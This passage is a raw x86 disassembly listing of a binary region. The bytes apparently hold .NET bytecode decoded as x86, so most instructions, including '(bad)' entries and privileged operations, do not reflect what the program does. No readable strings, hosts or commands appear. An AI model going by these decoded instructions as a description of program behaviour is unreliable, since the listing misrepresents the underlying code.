  4057f3:	00 3e                	add    %bh,(%esi)
  4057f5:	02 00                	add    (%eax),%al
  4057f7:	00 10                	add    %dl,(%eax)
  4057f9:	00 00                	add    %al,(%eax)
  4057fb:	00 20                	add    %ah,(%eax)
  4057fd:	00 00                	add    %al,(%eax)
  4057ff:	01 00                	add    %eax,(%eax)
  405801:	00 00                	add    %al,(%eax)
  405803:	00 53 02             	add    %dl,0x2(%ebx)
  405806:	00 00                	add    %al,(%eax)
  405808:	3a 00                	cmp    (%eax),%al
  40580a:	00 00                	add    %al,(%eax)
  40580c:	8d 02                	lea    (%edx),%eax
  40580e:	00 00                	add    %al,(%eax)
  405810:	10 00                	adc    %al,(%eax)
  405812:	00 00                	add    %al,(%eax)
  405814:	20 00                	and    %al,(%eax)
  405816:	00 01                	add    %al,(%ecx)
  405818:	13 30                	adc    (%eax),%esi
  40581a:	02 00                	add    (%eax),%al
  40581c:	12 00                	adc    (%eax),%al
  40581e:	00 00                	add    %al,(%eax)
  405820:	1d 00 00 11 00       	sbb    $0x110000,%eax
  405825:	28 2e                	sub    %ch,(%esi)
  405827:	00 00                	add    %al,(%eax)
  405829:	0a 02                	or     (%edx),%al
  40582b:	50                   	push   %eax
  40582c:	6f                   	outsl  %ds:(%esi),(%dx)
  40582d:	d4 00                	aam    $0x0
  40582f:	00 0a                	add    %cl,(%edx)
  405831:	0a 2b                	or     (%ebx),%ch
  405833:	00 06                	add    %al,(%esi)
  405835:	2a 00                	sub    (%eax),%al
  405837:	00 13                	add    %dl,(%ebx)
  405839:	30 01                	xor    %al,(%ecx)
  40583b:	00 12                	add    %dl,(%edx)
  40583d:	00 00                	add    %al,(%eax)
  40583f:	00 05 00 00 11 00    	add    %al,0x110000
  405845:	0f 00 28             	verw   (%eax)
  405848:	38 00                	cmp    %al,(%eax)
  40584a:	00 06                	add    %al,(%esi)
  40584c:	28 3a                	sub    %bh,(%edx)
  40584e:	00 00                	add    %al,(%eax)
  405850:	06                   	push   %es
  405851:	0a 2b                	or     (%ebx),%ch
  405853:	00 06                	add    %al,(%esi)
  405855:	2a 00                	sub    (%eax),%al
  405857:	00 1b                	add    %bl,(%ebx)
  405859:	30 05 00 08 01 00    	xor    %al,0x10800
  40585f:	00 1e                	add    %bl,(%esi)
  405861:	00 00                	add    %al,(%eax)
  405863:	11 00                	adc    %eax,(%eax)
  405865:	7e 0d                	jle    0x405874
  405867:	00 00                	add    %al,(%eax)
  405869:	04 16                	add    $0x16,%al
  40586b:	fe 01                	incb   (%ecx)
  40586d:	13 0a                	adc    (%edx),%ecx
  40586f:	11 0a                	adc    %ecx,(%edx)
  405871:	2c 07                	sub    $0x7,%al
  405873:	16                   	push   %ss
  405874:	0a 38                	or     (%eax),%bh
  405876:	f0 00 00             	lock add %al,(%eax)
  405879:	00 00                	add    %al,(%eax)
  40587b:	00 7e 19             	add    %bh,0x19(%esi)
  40587e:	00 00                	add    %al,(%eax)
  405880:	04 0b                	add    $0xb,%al
  405882:	00 07                	add    %al,(%edi)
  405884:	13 08                	adc    (%eax),%ecx
  405886:	11 08                	adc    %ecx,(%eax)
  405888:	28 37                	sub    %dh,(%edi)
  40588a:	00 00                	add    %al,(%eax)
  40588c:	0a 00                	or     (%eax),%al
  40588e:	00 7e 0d             	add    %bh,0xd(%esi)
  405891:	00 00                	add    %al,(%eax)
  405893:	04 16                	add    $0x16,%al
  405895:	fe 01                	incb   (%ecx)
  405897:	13 0a                	adc    (%edx),%ecx
  405899:	11 0a                	adc    %ecx,(%edx)
  40589b:	2c 07                	sub    $0x7,%al
  40589d:	16                   	push   %ss
  40589e:	0a dd                	or     %ch,%bl
  4058a0:	c6 00 00             	movb   $0x0,(%eax)
  4058a3:	00 00                	add    %al,(%eax)
  4058a5:	73 26                	jae    0x4058cd
  4058a7:	00 00                	add    %al,(%eax)
  4058a9:	0a 13                	or     (%ebx),%dl
  4058ab:	04 02                	add    $0x2,%al
  4058ad:	8e b7 0d 12 03 28    	mov    0x2803120d(%edi),%?
  4058b3:	d5 00                	aad    $0x0
  4058b5:	00 0a                	add    %cl,(%edx)
  4058b7:	72 5b                	jb     0x405914
  4058b9:	0c 00                	or     $0x0,%al
  4058bb:	70 28                	jo     0x4058e5
  4058bd:	4a                   	dec    %edx
  4058be:	00 00                	add    %al,(%eax)
  4058c0:	0a 13                	or     (%ebx),%dl
  4058c2:	09 12                	or     %edx,(%edx)
  4058c4:	09 28                	or     %ebp,(%eax)
  4058c6:	38 00                	cmp    %al,(%eax)
  4058c8:	00 06                	add    %al,(%esi)
  4058ca:	0c 11                	or     $0x11,%al
  4058cc:	04 08                	add    $0x8,%al
  4058ce:	16                   	push   %ss
  4058cf:	08 8e b7 6f 6f 00    	or     %cl,0x6f6fb7(%esi)
  4058d5:	00 0a                	add    %cl,(%edx)
  4058d7:	00 11                	add    %dl,(%ecx)
  4058d9:	04 02                	add    $0x2,%al
  4058db:	16                   	push   %ss
  4058dc:	02 8e b7 6f 6f 00    	add    0x6f6fb7(%esi),%cl
  4058e2:	00 0a                	add    %cl,(%edx)
  4058e4:	00 7e 0c             	add    %bh,0xc(%esi)
  4058e7:	00 00                	add    %al,(%eax)
  4058e9:	04 6f                	add    $0x6f,%al
  4058eb:	3d 00 00 0a 11       	cmp    $0x110a0000,%eax
  4058f0:	04 6f                	add    $0x6f,%al
  4058f2:	70 00                	jo     0x4058f4
  4058f4:	00 0a                	add    %cl,(%edx)
  4058f6:	16                   	push   %ss
  4058f7:	11 04 6f             	adc    %eax,(%edi,%ebp,2)
  4058fa:	8d 00                	lea    (%eax),%eax
  4058fc:	00 0a                	add    %cl,(%edx)
  4058fe:	b7 16                	mov    $0x16,%bh
  405900:	6f                   	outsl  %ds:(%esi),(%dx)
  405901:	d6                   	salc
  405902:	00 00                	add    %al,(%eax)
  405904:	0a 26                	or     (%esi),%ah
  405906:	00 de                	add    %bl,%dh
  405908:	09 11                	or     %edx,(%ecx)
  40590a:	08 28                	or     %ch,(%eax)
  40590c:	46                   	inc    %esi
  40590d:	00 00                	add    %al,(%eax)
  40590f:	0a 00                	or     (%eax),%al
  405911:	dc de                	(bad)
  405913:	4d                   	dec    %ebp
  405914:	25 28 2c 00 00       	and    $0x2c28,%eax
  405919:	0a 13                	or     (%ebx),%dl
  40591b:	06                   	push   %es
  40591c:	00 11                	add    %dl,(%ecx)
  40591e:	06                   	push   %es
  40591f:	28 2c 00             	sub    %ch,(%eax,%eax,1)
  405922:	00 0a                	add    %cl,(%edx)
  405924:	00 11                	add    %dl,(%ecx)
  405926:	06                   	push   %es
  405927:	13 05 00 7e 0d 00    	adc    0xd7e00,%eax
  40592d:	00 04 13             	add    %al,(%ebx,%edx,1)
  405930:	0a 11                	or     (%ecx),%dl
  405932:	0a 2c 11             	or     (%ecx,%edx,1),%ch
  405935:	16                   	push   %ss
  405936:	80 0d 00 00 04 7e 0c 	orb    $0xc,0x7e040000
  40593d:	00 00                	add    %al,(%eax)
  40593f:	04 6f                	add    $0x6f,%al
  405941:	38 00                	cmp    %al,(%eax)
  405943:	00 0a                	add    %cl,(%edx)
  405945:	00 00                	add    %al,(%eax)
  405947:	de 10                	ficoms (%eax)
  405949:	25 28 2c 00 00       	and    $0x2c28,%eax
  40594e:	0a 13                	or     (%ebx),%dl
  405950:	07                   	pop    %es
  405951:	00 28                	add    %ch,(%eax)
  405953:	2d 00 00 0a de       	sub    $0xde0a0000,%eax
  405958:	00 00                	add    %al,(%eax)
  40595a:	28 2d 00 00 0a de    	sub    %ch,0xde0a0000
  405960:	00 00                	add    %al,(%eax)
  405962:	7e 0d                	jle    0x405971
  405964:	00 00                	add    %al,(%eax)
  405966:	04 0a                	add    $0xa,%al
  405968:	2b 00                	sub    (%eax),%eax
  40596a:	06                   	push   %es
  40596b:	2a 01                	sub    (%ecx),%al
  40596d:	28 00                	sub    %al,(%eax)
  40596f:	00 02                	add    %al,(%edx)
  405971:	00 2b                	add    %ch,(%ebx)
  405973:	00 7a a5             	add    %bh,-0x5b(%edx)
  405976:	00 09                	add    %cl,(%ecx)
  405978:	00 00                	add    %al,(%eax)
  40597a:	00 00                	add    %al,(%eax)
  40597c:	00 00                	add    %al,(%eax)
  40597e:	c6 00 1f             	movb   $0x1f,(%eax)
  405981:	e5 00                	in     $0x0,%eax
  405983:	10 20                	adc    %ah,(%eax)
  405985:	00 00                	add    %al,(%eax)
  405987:	01 00                	add    %eax,(%eax)
  405989:	00 18                	add    %bl,(%eax)
  40598b:	00 98 b0 00 4d 20    	add    %bl,0x204d00b0(%eax)
  405991:	00 00                	add    %al,(%eax)
  405993:	01 1b                	add    %ebx,(%ebx)
  405995:	30 04 00             	xor    %al,(%eax,%eax,1)
  405998:	62 00                	bound  %eax,(%eax)
  40599a:	00 00                	add    %al,(%eax)
  40599c:	1f                   	pop    %ds
  40599d:	00 00                	add    %al,(%eax)
  40599f:	11 00                	adc    %eax,(%eax)
  4059a1:	00 7e 10             	add    %bh,0x10(%esi)
  4059a4:	00 00                	add    %al,(%eax)
  4059a6:	04 6f                	add    $0x6f,%al
  4059a8:	48                   	dec    %eax
  4059a9:	00 00                	add    %al,(%eax)
  4059ab:	0a 6f 49             	or     0x49(%edi),%ch
  4059ae:	00 00                	add    %al,(%eax)
  4059b0:	0a 72 9d             	or     -0x63(%edx),%dh
  4059b3:	01 00                	add    %eax,(%eax)
  4059b5:	70 7e                	jo     0x405a35
  4059b7:	1f                   	pop    %ds
  4059b8:	00 00                	add    %al,(%eax)
  4059ba:	04 28                	add    $0x28,%al
  4059bc:	4a                   	dec    %edx
  4059bd:	00 00                	add    %al,(%eax)
  4059bf:	0a 6f d7             	or     -0x29(%edi),%ch
  4059c2:	00 00                	add    %al,(%eax)
  4059c4:	0a 02                	or     (%edx),%al
  4059c6:	03 28                	add    (%eax),%ebp
  4059c8:	0c 00                	or     $0x0,%al
  4059ca:	00 0a                	add    %cl,(%edx)
  4059cc:	28 0c 00             	sub    %cl,(%eax,%eax,1)
  4059cf:	00 0a                	add    %cl,(%edx)
  4059d1:	28 0c 00             	sub    %cl,(%eax,%eax,1)
  4059d4:	00 0a                	add    %cl,(%edx)
  4059d6:	04 6f                	add    $0x6f,%al
  4059d8:	d8 00                	fadds  (%eax)
  4059da:	00 0a                	add    %cl,(%edx)
  4059dc:	00 17                	add    %dl,(%edi)
  4059de:	0a de                	or     %dh,%bl
  4059e0:	1f                   	pop    %ds
  4059e1:	de 18                	ficomps (%eax)
  4059e3:	25 28 2c 00 00       	and    $0x2c28,%eax
  4059e8:	0a 0b                	or     (%ebx),%cl
  4059ea:	00 16                	add    %dl,(%esi)
  4059ec:	0a 28                	or     (%eax),%ch
  4059ee:	2d 00 00 0a de       	sub    $0xde0a0000,%eax
  4059f3:	0c 28                	or     $0x28,%al
  4059f5:	2d 00 00 0a de       	sub    $0xde0a0000,%eax
  4059fa:	00 00                	add    %al,(%eax)
  4059fc:	16                   	push   %ss
  4059fd:	0a 2b                	or     (%ebx),%ch
  4059ff:	00 06                	add    %al,(%esi)
  405a01:	2a 00                	sub    (%eax),%al
  405a03:	00 01                	add    %al,(%ecx)
  405a05:	10 00                	adc    %al,(%eax)
  405a07:	00 00                	add    %al,(%eax)
  405a09:	00 02                	add    %al,(%edx)
  405a0b:	00 41 43             	add    %al,0x43(%ecx)
  405a0e:	00 18                	add    %bl,(%eax)
  405a10:	20 00                	and    %al,(%eax)
  405a12:	00 01                	add    %al,(%ecx)
  405a14:	1b 30                	sbb    (%eax),%esi
  405a16:	04 00                	add    $0x0,%al
  405a18:	c1 01 00             	roll   $0x0,(%ecx)
  405a1b:	00 20                	add    %ah,(%eax)
  405a1d:	00 00                	add    %al,(%eax)
  405a1f:	11 00                	adc    %eax,(%eax)
  405a21:	16                   	push   %ss
  405a22:	28 36                	sub    %dh,(%esi)
  405a24:	00 00                	add    %al,(%eax)
  405a26:	06                   	push   %es
  405a27:	00 16                	add    %dl,(%esi)
  405a29:	80 16 00             	adcb   $0x0,(%esi)
  405a2c:	00 04 00             	add    %al,(%eax,%eax,1)
  405a2f:	28 a1 00 00 0a 20    	sub    %ah,0x200a0000(%ecx)
  405a35:	80 00 00             	addb   $0x0,(%eax)
  405a38:	00 28                	add    %ch,(%eax)
  405a3a:	a2 00 00 0a 00       	mov    %al,0xa0000
  405a3f:	de 0f                	fimuls (%edi)
  405a41:	25 28 2c 00 00       	and    $0x2c28,%eax
  405a46:	0a 0a                	or     (%edx),%cl
  405a48:	00 28                	add    %ch,(%eax)
  405a4a:	2d 00 00 0a de       	sub    $0xde0a0000,%eax
  405a4f:	00 00                	add    %al,(%eax)
  405a51:	00 7e 10             	add    %bh,0x10(%esi)
  405a54:	00 00                	add    %al,(%eax)
  405a56:	04 6f                	add    $0x6f,%al
  405a58:	48                   	dec    %eax
  405a59:	00 00                	add    %al,(%eax)
  405a5b:	0a 6f 49             	or     0x49(%edi),%ch
  405a5e:	00 00                	add    %al,(%eax)
  405a60:	0a 7e 20             	or     0x20(%esi),%bh
  405a63:	00 00                	add    %al,(%eax)
  405a65:	04 17                	add    $0x17,%al
  405a67:	6f                   	outsl  %ds:(%esi),(%dx)
  405a68:	4b                   	dec    %ebx
  405a69:	00 00                	add    %al,(%eax)
  405a6b:	0a 7e 1f             	or     0x1f(%esi),%bh
  405a6e:	00 00                	add    %al,(%eax)
  405a70:	04 16                	add    $0x16,%al
  405a72:	6f                   	outsl  %ds:(%esi),(%dx)
  405a73:	d9 00                	flds   (%eax)
  405a75:	00 0a                	add    %cl,(%edx)
  405a77:	00 de                	add    %bl,%dh
  405a79:	0f 25                	(bad)
  405a7b:	28 2c 00             	sub    %ch,(%eax,%eax,1)
  405a7e:	00 0a                	add    %cl,(%edx)
  405a80:	0b 00                	or     (%eax),%eax
  405a82:	28 2d 00 00 0a de    	sub    %ch,0xde0a0000
  405a88:	00 00                	add    %al,(%eax)
  405a8a:	00 7e 10             	add    %bh,0x10(%esi)
  405a8d:	00 00                	add    %al,(%eax)
  405a8f:	04 6f                	add    $0x6f,%al
  405a91:	48                   	dec    %eax
  405a92:	00 00                	add    %al,(%eax)
  405a94:	0a 6f a5             	or     -0x5b(%edi),%ch
  405a97:	00 00                	add    %al,(%eax)
  405a99:	0a 7e 20             	or     0x20(%esi),%bh
  405a9c:	00 00                	add    %al,(%eax)
  405a9e:	04 17                	add    $0x17,%al
  405aa0:	6f                   	outsl  %ds:(%esi),(%dx)
  405aa1:	4b                   	dec    %ebx
  405aa2:	00 00                	add    %al,(%eax)
  405aa4:	0a 7e 1f             	or     0x1f(%esi),%bh
  405aa7:	00 00                	add    %al,(%eax)
  405aa9:	04 16                	add    $0x16,%al
  405aab:	6f                   	outsl  %ds:(%esi),(%dx)
  405aac:	d9 00                	flds   (%eax)
  405aae:	00 0a                	add    %cl,(%edx)
  405ab0:	00 de                	add    %bl,%dh
  405ab2:	0f 25                	(bad)
  405ab4:	28 2c 00             	sub    %ch,(%eax,%eax,1)
  405ab7:	00 0a                	add    %cl,(%edx)
  405ab9:	0c 00                	or     $0x0,%al
  405abb:	28 2d 00 00 0a de    	sub    %ch,0xde0a0000
  405ac1:	00 00                	add    %al,(%eax)
  405ac3:	00 72 5f             	add    %dh,0x5f(%edx)
  405ac6:	0c 00                	or     $0x0,%al
  405ac8:	70 7e                	jo     0x405b48
  405aca:	19 00                	sbb    %eax,(%eax)
  405acc:	00 04 6f             	add    %al,(%edi,%ebp,2)
  405acf:	91                   	xchg   %eax,%ecx
  405ad0:	00 00                	add    %al,(%eax)
  405ad2:	0a 72 b7             	or     -0x49(%edx),%dh
  405ad5:	0b 00                	or     (%eax),%eax
  405ad7:	70 28                	jo     0x405b01
  405ad9:	43                   	inc    %ebx
  405ada:	00 00                	add    %al,(%eax)
  405adc:	0a 16                	or     (%esi),%dl
  405ade:	16                   	push   %ss
  405adf:	15 28 56 00 00       	adc    $0x5628,%eax
  405ae4:	0a 26                	or     (%esi),%ah
  405ae6:	de 0f                	fimuls (%edi)
  405ae8:	25 28 2c 00 00       	and    $0x2c28,%eax
  405aed:	0a 0d 00 28 2d 00    	or     0x2d2800,%cl
  405af3:	00 0a                	add    %cl,(%edx)
  405af5:	de 00                	fiadds (%eax)
  405af7:	00 00                	add    %al,(%eax)
  405af9:	7e 11                	jle    0x405b0c
  405afb:	00 00                	add    %al,(%eax)
  405afd:	04 14                	add    $0x14,%al
  405aff:	fe 01                	incb   (%ecx)
  405b01:	16                   	push   %ss
  405b02:	fe 01                	incb   (%ecx)
  405b04:	13 07                	adc    (%edi),%eax
  405b06:	11 07                	adc    %eax,(%edi)
  405b08:	2c 3b                	sub    $0x3b,%al
  405b0a:	28 a1 00 00 0a 20    	sub    %ah,0x200a0000(%ecx)
  405b10:	80 00 00             	addb   $0x0,(%eax)
  405b13:	00 28                	add    %ch,(%eax)
  405b15:	a2 00 00 0a 00       	mov    %al,0xa0000
  405b1a:	7e 11                	jle    0x405b2d
  405b1c:	00 00                	add    %al,(%eax)
  405b1e:	04 6f                	add    $0x6f,%al
  405b20:	39 00                	cmp    %eax,(%eax)
  405b22:	00 0a                	add    %cl,(%edx)
  405b24:	00 1d 28 9d 00 00    	add    %bl,0x9d28
  405b2a:	0a 72 c9             	or     -0x37(%edx),%dh
  405b2d:	01 00                	add    %eax,(%eax)
  405b2f:	70 7e                	jo     0x405baf
  405b31:	1f                   	pop    %ds
  405b32:	00 00                	add    %al,(%eax)
  405b34:	04 72                	add    $0x72,%al
  405b36:	41                   	inc    %ecx
  405b37:	0a 00                	or     (%eax),%al
  405b39:	70 28                	jo     0x405b63
  405b3b:	6c                   	insb   (%dx),%es:(%edi)
  405b3c:	00 00                	add    %al,(%eax)
  405b3e:	0a 28                	or     (%eax),%ch
  405b40:	a3 00 00 0a 00       	mov    %eax,0xa0000
  405b45:	00 de                	add    %bl,%dh
  405b47:	10 25 28 2c 00 00    	adc    %ah,0x2c28
  405b4d:	0a 13                	or     (%ebx),%dl
  405b4f:	04 00                	add    $0x0,%al
  405b51:	28 2d 00 00 0a de    	sub    %ch,0xde0a0000
  405b57:	00 00                	add    %al,(%eax)
  405b59:	00 7e 10             	add    %bh,0x10(%esi)
  405b5c:	00 00                	add    %al,(%eax)
  405b5e:	04 6f                	add    $0x6f,%al
  405b60:	48                   	dec    %eax
  405b61:	00 00                	add    %al,(%eax)
  405b63:	0a 6f 49             	or     0x49(%edi),%ch
  405b66:	00 00                	add    %al,(%eax)
  405b68:	0a 72 ad             	or     -0x53(%edx),%dh
  405b6b:	0c 00                	or     $0x0,%al
  405b6d:	70 17                	jo     0x405b86
  405b6f:	6f                   	outsl  %ds:(%esi),(%dx)
  405b70:	4b                   	dec    %ebx
  405b71:	00 00                	add    %al,(%eax)
  405b73:	0a 7e 1f             	or     0x1f(%esi),%bh
  405b76:	00 00                	add    %al,(%eax)
  405b78:	04 16                	add    $0x16,%al
  405b7a:	6f                   	outsl  %ds:(%esi),(%dx)
  405b7b:	da 00                	fiaddl (%eax)
  405b7d:	00 0a                	add    %cl,(%edx)
  405b7f:	00 de                	add    %bl,%dh
  405b81:	10 25 28 2c 00 00    	adc    %ah,0x2c28
  405b87:	0a 13                	or     (%ebx),%dl
  405b89:	05 00 28 2d 00       	add    $0x2d2800,%eax
  405b8e:	00 0a                	add    %cl,(%edx)
  405b90:	de 00                	fiadds (%eax)
  405b92:	00 00                	add    %al,(%eax)
  405b94:	28 a1 00 00 0a 20    	sub    %ah,0x200a0000(%ecx)
  405b9a:	80 00 00             	addb   $0x0,(%eax)
  405b9d:	00 28                	add    %ch,(%eax)
  405b9f:	a2 00 00 0a 00       	mov    %al,0xa0000
  405ba4:	72 bf                	jb     0x405b65
  405ba6:	0c 00                	or     $0x0,%al
  405ba8:	70 7e                	jo     0x405c28
  405baa:	19 00                	sbb    %eax,(%eax)
  405bac:	00 04 6f             	add    %al,(%edi,%ebp,2)
  405baf:	91                   	xchg   %eax,%ecx
  405bb0:	00 00                	add    %al,(%eax)
  405bb2:	0a 72 f3             	or     -0xd(%edx),%dh
  405bb5:	0c 00                	or     $0x0,%al
  405bb7:	70 28                	jo     0x405be1
  405bb9:	43                   	inc    %ebx
  405bba:	00 00                	add    %al,(%eax)
  405bbc:	0a 16                	or     (%esi),%dl
  405bbe:	16                   	push   %ss
  405bbf:	15 28 56 00 00       	adc    $0x5628,%eax
  405bc4:	0a 26                	or     (%esi),%ah
  405bc6:	de 10                	ficoms (%eax)
  405bc8:	25 28 2c 00 00       	and    $0x2c28,%eax
  405bcd:	0a 13                	or     (%ebx),%dl
  405bcf:	06                   	push   %es
  405bd0:	00 28                	add    %ch,(%eax)
  405bd2:	2d 00 00 0a de       	sub    $0xde0a0000,%eax
  405bd7:	00 00                	add    %al,(%eax)
  405bd9:	28 90 00 00 0a 00    	sub    %dl,0xa0000(%eax)
  405bdf:	00 2a                	add    %ch,(%edx)
  405be1:	00 00                	add    %al,(%eax)
  405be3:	00 01                	add    %al,(%ecx)
  405be5:	58                   	pop    %eax
  405be6:	00 00                	add    %al,(%eax)
  405be8:	00 00                	add    %al,(%eax)
  405bea:	0f 00 12             	lldt   (%edx)
  405bed:	21 00                	and    %eax,(%eax)
  405bef:	0f 20 00             	mov    %cr0,%eax
  405bf2:	00 01                	add    %al,(%ecx)
  405bf4:	00 00                	add    %al,(%eax)
  405bf6:	32 00                	xor    (%eax),%al
  405bf8:	28 5a 00             	sub    %bl,0x0(%edx)
  405bfb:	0f 20 00             	mov    %cr0,%eax
  405bfe:	00 01                	add    %al,(%ecx)
  405c00:	00 00                	add    %al,(%eax)
  405c02:	6b 00 28             	imul   $0x28,(%eax),%eax
  405c05:	93                   	xchg   %eax,%ebx
  405c06:	00 0f                	add    %cl,(%edi)
  405c08:	20 00                	and    %al,(%eax)
  405c0a:	00 01                	add    %al,(%ecx)
  405c0c:	00 00                	add    %al,(%eax)
  405c0e:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  405c0f:	00 24 c8             	add    %ah,(%eax,%ecx,8)
  405c12:	00 0f                	add    %cl,(%edi)
  405c14:	20 00                	and    %al,(%eax)
  405c16:	00 01                	add    %al,(%ecx)
  405c18:	00 00                	add    %al,(%eax)
  405c1a:	d9 00                	flds   (%eax)
  405c1c:	4f                   	dec    %edi
  405c1d:	28 01                	sub    %al,(%ecx)
  405c1f:	10 20                	adc    %ah,(%eax)
  405c21:	00 00                	add    %al,(%eax)
  405c23:	01 00                	add    %eax,(%eax)
  405c25:	00 3a                	add    %bh,(%edx)
  405c27:	01 28                	add    %ebp,(%eax)
  405c29:	62 01                	bound  %eax,(%ecx)
  405c2b:	10 20                	adc    %ah,(%eax)
  405c2d:	00 00                	add    %al,(%eax)
  405c2f:	01 00                	add    %eax,(%eax)
  405c31:	00 74 01 34          	add    %dh,0x34(%ecx,%eax,1)
  405c35:	a8 01                	test   $0x1,%al
  405c37:	10 20                	adc    %ah,(%eax)
  405c39:	00 00                	add    %al,(%eax)
  405c3b:	01 13                	add    %edx,(%ebx)
  405c3d:	30 04 00             	xor    %al,(%eax,%eax,1)
  405c40:	74 00                	je     0x405c42
  405c42:	00 00                	add    %al,(%eax)
  405c44:	21 00                	and    %eax,(%eax)
  405c46:	00 11                	add    %dl,(%ecx)
  405c48:	00 02                	add    %al,(%edx)
  405c4a:	73 db                	jae    0x405c27
  405c4c:	00 00                	add    %al,(%eax)
  405c4e:	0a 0d 09 16 73 dc    	or     0xdc731609,%cl
  405c54:	00 00                	add    %al,(%eax)
  405c56:	0a 0c 1a             	or     (%edx,%ebx,1),%cl
  405c59:	8d 1c 00             	lea    (%eax,%eax,1),%ebx
  405c5c:	00 01                	add    %al,(%ecx)
  405c5e:	0b 09                	or     (%ecx),%ecx
  405c60:	09 6f 8d             	or     %ebp,-0x73(%edi)
  405c63:	00 00                	add    %al,(%eax)
  405c65:	0a 1b                	or     (%ebx),%bl
  405c67:	6a da                	push   $0xffffffda
  405c69:	6f                   	outsl  %ds:(%esi),(%dx)
  405c6a:	dd 00                	fldl   (%eax)
  405c6c:	00 0a                	add    %cl,(%edx)
  405c6e:	00 09                	add    %cl,(%ecx)
  405c70:	07                   	pop    %es
  405c71:	16                   	push   %ss
  405c72:	1a 6f de             	sbb    -0x22(%edi),%ch
  405c75:	00 00                	add    %al,(%eax)
  405c77:	0a 26                	or     (%esi),%ah
  405c79:	07                   	pop    %es
  405c7a:	16                   	push   %ss
  405c7b:	28 df                	sub    %bl,%bh
  405c7d:	00 00                	add    %al,(%eax)
  405c7f:	0a 13                	or     (%ebx),%dl
  405c81:	04 09                	add    $0x9,%al
  405c83:	16                   	push   %ss
  405c84:	6a 6f                	push   $0x6f
  405c86:	dd 00                	fldl   (%eax)
  405c88:	00 0a                	add    %cl,(%edx)
  405c8a:	00 11                	add    %dl,(%ecx)
  405c8c:	04 17                	add    $0x17,%al
  405c8e:	da 17                	ficoml (%edi)
  405c90:	d6                   	salc
  405c91:	17                   	pop    %ss
  405c92:	da 17                	ficoml (%edi)
  405c94:	d6                   	salc
  405c95:	8d 1c 00             	lea    (%eax,%eax,1),%ebx
  405c98:	00 01                	add    %al,(%ecx)
  405c9a:	0a 08                	or     (%eax),%cl
  405c9c:	06                   	push   %es
  405c9d:	16                   	push   %ss
  405c9e:	11 04 6f             	adc    %eax,(%edi,%ebp,2)
  405ca1:	e0 00                	loopne 0x405ca3
  405ca3:	00 0a                	add    %cl,(%edx)
  405ca5:	26 08 6f 39          	or     %ch,%es:0x39(%edi)
  405ca9:	00 00                	add    %al,(%eax)
  405cab:	0a 00                	or     (%eax),%al
  405cad:	09 6f 39             	or     %ebp,0x39(%edi)
  405cb0:	00 00                	add    %al,(%eax)
  405cb2:	0a 00                	or     (%eax),%al
  405cb4:	06                   	push   %es
  405cb5:	13 05 2b 00 11 05    	adc    0x511002b,%eax
  405cbb:	2a 9a 02 28 12 00    	sub    0x122802(%edx),%bl
  405cc1:	00 0a                	add    %cl,(%edx)
  405cc3:	00 02                	add    %al,(%edx)
  405cc5:	16                   	push   %ss
  405cc6:	7d 2e                	jge    0x405cf6
  405cc8:	00 00                	add    %al,(%eax)
  405cca:	04 02                	add    $0x2,%al
  405ccc:	72 69                	jb     0x405d37
  405cce:	00 00                	add    %al,(%eax)
  405cd0:	70 7d                	jo     0x405d4f
  405cd2:	2f                   	das
  405cd3:	00 00                	add    %al,(%eax)
  405cd5:	04 02                	add    $0x2,%al
  405cd7:	72 05                	jb     0x405cde
  405cd9:	0d 00 70 7d 30       	or     $0x307d7000,%eax
  405cde:	00 00                	add    %al,(%eax)
  405ce0:	04 00                	add    $0x0,%al
  405ce2:	2a 00                	sub    (%eax),%al
  405ce4:	1b 30                	sbb    (%eax),%esi
  405ce6:	04 00                	add    $0x0,%al
  405ce8:	fc                   	cld
  405ce9:	00 00                	add    %al,(%eax)
  405ceb:	00 22                	add    %ah,(%edx)
  405ced:	00 00                	add    %al,(%eax)
  405cef:	11 00                	adc    %eax,(%eax)
  405cf1:	00 28                	add    %ch,(%eax)
  405cf3:	1a 00                	sbb    (%eax),%al
  405cf5:	00 06                	add    %al,(%esi)
  405cf7:	0b 07                	or     (%edi),%eax
  405cf9:	12 02                	adc    (%edx),%al
  405cfb:	28 44 00 00          	sub    %al,0x0(%eax,%eax,1)
  405cff:	06                   	push   %es
  405d00:	26 08 28             	or     %ch,%es:(%eax)
  405d03:	e1 00                	loope  0x405d05
  405d05:	00 0a                	add    %cl,(%edx)
  405d07:	0d 12 01 28 e2       	or     $0xe2280112,%eax
  405d0c:	00 00                	add    %al,(%eax)
  405d0e:	0a 02                	or     (%edx),%al
  405d10:	7b 2d                	jnp    0x405d3f
  405d12:	00 00                	add    %al,(%eax)
  405d14:	04 fe                	add    $0xfe,%al
  405d16:	01 02                	add    %eax,(%edx)
  405d18:	7b 2c                	jnp    0x405d46
  405d1a:	00 00                	add    %al,(%eax)
  405d1c:	04 09                	add    $0x9,%al
  405d1e:	6f                   	outsl  %ds:(%esi),(%dx)
  405d1f:	e3 00                	jecxz  0x405d21
  405d21:	00 0a                	add    %cl,(%edx)
  405d23:	16                   	push   %ss
  405d24:	28 32                	sub    %dh,(%edx)
  405d26:	00 00                	add    %al,(%eax)
  405d28:	0a 16                	or     (%esi),%dl
  405d2a:	fe 01                	incb   (%ecx)
  405d2c:	5f                   	pop    %edi
  405d2d:	09 6f e3             	or     %ebp,-0x1d(%edi)
  405d30:	00 00                	add    %al,(%eax)
  405d32:	0a 6f 2b             	or     0x2b(%edi),%ch
  405d35:	00 00                	add    %al,(%eax)
  405d37:	0a 16                	or     (%esi),%dl
  405d39:	fe 01                	incb   (%ecx)
  405d3b:	60                   	pusha
  405d3c:	16                   	push   %ss
  405d3d:	fe 01                	incb   (%ecx)
  405d3f:	13 08                	adc    (%eax),%ecx
  405d41:	11 08                	adc    %ecx,(%eax)
  405d43:	2c 77                	sub    $0x77,%al
  405d45:	02 12                	add    (%edx),%dl
  405d47:	01 28                	add    %ebp,(%eax)
  405d49:	e2 00                	loop   0x405d4b
  405d4b:	00 0a                	add    %cl,(%edx)
  405d4d:	7d 2d                	jge    0x405d7c
  405d4f:	00 00                	add    %al,(%eax)
  405d51:	04 02                	add    $0x2,%al
  405d53:	09 6f e3             	or     %ebp,-0x1d(%edi)
  405d56:	00 00                	add    %al,(%eax)
  405d58:	0a 7d 2c             	or     0x2c(%ebp),%bh
  405d5b:	00 00                	add    %al,(%eax)
  405d5d:	04 1c                	add    $0x1c,%al
  405d5f:	8d 23                	lea    (%ebx),%esp
  405d61:	00 00                	add    %al,(%eax)
  405d63:	01 13                	add    %edx,(%ebx)
  405d65:	07                   	pop    %es
  405d66:	11 07                	adc    %eax,(%edi)
  405d68:	16                   	push   %ss
  405d69:	72 0f                	jb     0x405d7a
